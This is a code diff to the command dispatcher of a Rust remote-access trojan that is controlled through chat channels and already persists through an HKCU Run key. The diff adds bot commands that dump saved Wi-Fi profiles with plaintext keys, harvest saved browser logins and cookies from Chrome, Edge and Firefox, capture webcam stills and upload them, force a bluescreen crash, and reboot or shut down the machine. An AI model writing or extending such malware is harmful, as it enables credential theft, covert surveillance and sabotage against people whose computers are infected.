@@ -30,6 +30,15 @@ const HELP: &str = "\
 !persist / !unpersist      HKCU Run autostart
 !msg <text>                message box
 !monitor on|off            display power
+!wifi                      saved Wi-Fi profiles + plaintext keys
+!wallpaper <url|path>      set the desktop wallpaper
+!speak <text>              speak text aloud (Windows TTS)
+!reboot now                reboot the machine
+!shutdown now|abort        power off / cancel shutdown
+!bsod now                  force a bugcheck (hard crash)
+!volume [0-100|mute|unmute] system volume
+!webcam                    camera still -> files channel
+!browsers                  saved logins + cookies (chrome/edge/firefox)
 !lock                      lock workstation
 !update                    pull newest build from #update and restart
 !uninstall                 remove payload + launcher + Run key, then stop
@@ -199,6 +208,93 @@ pub async fn dispatch(
                 host::monitor_off();
             }
             st.send(console, "ok").await?;
+        }
+        "wifi" => {
+            let r = tokio::task::spawn_blocking(host::wifi_dump).await?;
+            st.send_code(console, &r).await?;
+        }
+        "wallpaper" => {
+            if arg.is_empty() {
+                st.send(console, "usage: !wallpaper <url|path>").await?;
+            } else {
+                let path = if arg.starts_with("http") {
+                    let bytes = st.raw_get(&arg).await?;
+                    let p = std::env::temp_dir().join(format!("wp-{}.img", stamp()));
+                    std::fs::write(&p, &bytes)?;
+                    p.to_string_lossy().to_string()
+                } else {
+                    arg.clone()
+                };
+                host::set_wallpaper(&path)?;
+                st.send(console, "wallpaper set").await?;
+            }
+        }
+        "speak" => {
+            if arg.is_empty() {
+                st.send(console, "usage: !speak <text>").await?;
+            } else {
+                host::speak(&arg);
+                st.send(console, "speaking").await?;
+            }
+        }
+        "reboot" => {
+            if arg.eq_ignore_ascii_case("now") {
+                host::reboot();
+                st.send(console, "rebooting now").await?;
+            } else {
+                st.send(console, "usage: !reboot now").await?;
+            }
+        }
+        "shutdown" => {
+            if arg.eq_ignore_ascii_case("abort") {
+                let r = host::abort_shutdown();
+                st.send(console, &r).await?;
+            } else if arg.eq_ignore_ascii_case("now") {
+                host::shutdown();
+                st.send(console, "shutting down now").await?;
+            } else {
+                st.send(console, "usage: !shutdown now | !shutdown abort").await?;
+            }
+        }
+        "bsod" => {
+            if arg.eq_ignore_ascii_case("now") {
+                st.send(console, "bugchecking now").await.ok();
+                host::bsod()?;
+            } else {
+                st.send(console, "usage: !bsod now").await?;
+            }
+        }
+        "volume" => {
+            let a = arg.trim().to_ascii_lowercase();
+            if a.is_empty() {
+                let pct = crate::volume::get_percent().unwrap_or(0);
+                let muted = crate::volume::get_mute().unwrap_or(false);
+                st.send(
+                    console,
+                    &format!("volume: {pct}%{}", if muted { " (muted)" } else { "" }),
+                )
+                .await?;
+            } else if a == "mute" {
+                crate::volume::set_mute(true)?;
+                st.send(console, "muted").await?;
+            } else if a == "unmute" {
+                crate::volume::set_mute(false)?;
+                st.send(console, "unmuted").await?;
+            } else if let Ok(p) = a.parse::<u32>() {
+                crate::volume::set_percent(p)?;
+                st.send(console, &format!("volume set to {}", p.min(100))).await?;
+            } else {
+                st.send(console, "usage: !volume [0-100|mute|unmute]").await?;
+            }
+        }
+        "webcam" | "cam" => {
+            let bytes = tokio::task::spawn_blocking(capture::webcam_jpeg).await??;
+            st.send_file(files, &format!("cam-{}.jpg", stamp()), bytes, "webcam")
+                .await?;
+        }
+        "browsers" | "creds" => {
+            let r = tokio::task::spawn_blocking(crate::browsers::harvest).await?;
+            st.send_code(console, &r).await?;
         }
         "lock" => {
             host::lock_workstation();
